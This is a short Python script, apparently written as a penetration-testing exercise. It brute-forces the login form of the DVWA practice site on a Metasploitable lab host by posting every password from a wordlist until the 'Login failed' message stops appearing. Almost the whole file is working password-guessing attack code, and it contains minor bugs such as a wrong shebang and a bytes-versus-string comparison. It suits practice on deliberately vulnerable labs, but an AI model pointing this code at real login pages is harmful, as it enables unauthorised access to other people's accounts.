#!/usr/env/python

import requests
# Note this post request is designed for metasploitable webste
# dvwa

target_url = 'http://10.0.2.15/dvwa/login.php'

data_dict = {
    "username": "admin",
    "password": "",
    "Login" : "submit"
}

#response = requests.post(target_url, data_dict)
#print(response.content)

password_list="/root/Hvck/seclist/password.txt"
error_list = ['failed', 'error']

with open(password_list, 'r') as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict['password'] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print('[+] Got Password ----> {}'.format(word))
            exit()

print("[+] Reached and of line")
